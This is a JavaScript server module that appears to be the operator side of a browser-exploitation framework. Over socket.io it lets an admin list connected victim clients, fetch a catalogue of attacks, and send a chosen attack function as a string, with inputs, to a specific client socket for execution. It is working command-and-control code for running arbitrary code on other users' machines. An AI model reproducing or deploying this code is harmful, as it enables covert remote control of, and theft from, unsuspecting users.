var socketio = require('socket.io');
var clientSockets = require('../clientApp/sockets');
var server = require('../server');
var attacksObj = require('../attacks');
//attacks is stored as an object for constant time lookup
var attacks = attacksObj.attacks;
var attacksArr = [];

module.exports.listen = function(app){
  io = socketio.listen(app);

  io.on('connection', function(socket){

    console.log('admin connected');

    socket.join('admins');

    module.exports.emit = function(eventName, data){
      socket.emit(eventName, data);
    };
    
    socket.on('getUsers', getUsers);

    socket.on('getAttacks', getAttacks);

    socket.on('disconnect', disconnect);

    socket.on('attackUser', attackUser);

  });

  return io;
};

var getUsers = function(){
  clientSockets.sendUsers(clientSockets.sockets);
};

//build out attacks array once so it wont need to be recreated on each request for it
for(var attack in attacks){
  attacksArr.push(attacks[attack]);
}
var getAttacks = function(){
  module.exports.emit('attacks', attacksArr);
};

var disconnect = function(){
  console.log('admin disconnected');
};

var attackUser = function(data){
  var ioClient = server.ioClient;
  console.log("received instructions to use attack " + data.attack + " on " + data.userSocket);
  if(data.followup){
    var attack = attacks[data.attack].followup.attack;
  }else{
    var attack = attacks[data.attack].attack; 
  }
  console.log(data.userSocket);
  ioClient.to(data.userSocket).emit('execute', { func: "var attack = " + attack.toString(), inputs: data.inputs });
};
